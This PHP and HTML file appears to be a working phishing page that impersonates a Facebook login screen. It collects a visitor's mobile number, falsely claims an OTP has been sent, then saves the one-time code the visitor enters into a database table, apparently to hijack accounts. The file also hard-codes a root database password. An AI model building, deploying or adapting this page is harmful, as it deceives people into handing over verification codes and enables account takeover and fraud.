<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$host = "localhost";
$username = "root";
$password = "Yog8303";
$database = "main_user";

$conn = new mysqli($host, $username, $password, $database);
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

$message = "";
$showOtp = false;
$mobile = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  if (isset($_POST['submit_mobile'])) {
    $mobile = trim($_POST['mobile']);
    if (!preg_match("/^[6-9][0-9]{9}$/", $mobile)) {
      $message = "Invalid mobile number!";
    } else {
      $stmt = $conn->prepare("SELECT id FROM facebook WHERE mobile = ?");
      $stmt->bind_param("s", $mobile);
      $stmt->execute();
      $stmt->store_result();

      if ($stmt->num_rows > 0) {
        $message = "Mobile number already exists!";
        $showOtp = true;
      } else {
        $stmt = $conn->prepare("INSERT INTO facebook (mobile) VALUES (?)");
        $stmt->bind_param("s", $mobile);
        if ($stmt->execute()) {
          $message = "OTP has been successfully sent to your mobile number";
          $showOtp = true;
        } else {
          $message = "Error saving mobile!";
        }
        $stmt->close();
      }
    }
  }

  if (isset($_POST['submit_otp'])) {
    $mobile = trim($_POST['mobile']);
    $otp = trim($_POST['otp']);
    if (!preg_match("/^\d{4,8}$/", $otp)) {
      $message = "Invalid OTP format!";
      $showOtp = true;
    } else {
      $stmt = $conn->prepare("UPDATE facebook SET otp = ? WHERE mobile = ?");
      $stmt->bind_param("ss", $otp, $mobile);
      if ($stmt->execute()) {
        $message = "Your mobile number has been successfully verified";
      } else {
        $message = "Error saving OTP!";
      }
      $stmt->close();
    }
  }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h2>Log in to Facebook</h2>

    <!-- Mobile Number Form -->
    <form method="POST" id="mobileForm">
      <label for="mobile">Mobile Number:</label>
      <input 
        type="text" 
        id="mobile" 
        name="mobile" 
        placeholder="Email address or phone number" 
        required 
        value="<?php echo htmlspecialchars($mobile); ?>"
        <?php if ($showOtp) echo 'readonly'; ?>
      >
      <small id="mobileError" class="error"></small>

      <?php if (!$showOtp): ?>
        <button type="submit" name="submit_mobile" id="saveMobile">Verify</button>
      <?php endif; ?>
    </form>

    <!-- OTP Form -->
    <?php if ($showOtp): ?>
      <form method="POST" id="otpForm">
        <input type="hidden" name="mobile" value="<?php echo htmlspecialchars($mobile); ?>">
        <!--<label for="otp">OTP:</label>  -->
        <input type="text" id="otp" name="otp" placeholder="Enter OTP" required>
        <small id="otpError" class="error"></small>
        <button type="submit" name="submit_otp" id="saveOtp">Verify OTP</button>
      </form>
    <?php endif; ?>

    <!-- Message -->
    <?php if (!empty($message)) echo "<p class='msg'>$message</p>"; ?>

    <!-- Footer -->
    <div class="bottom-text">
      Forgotten account? · Sign up for Facebook
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
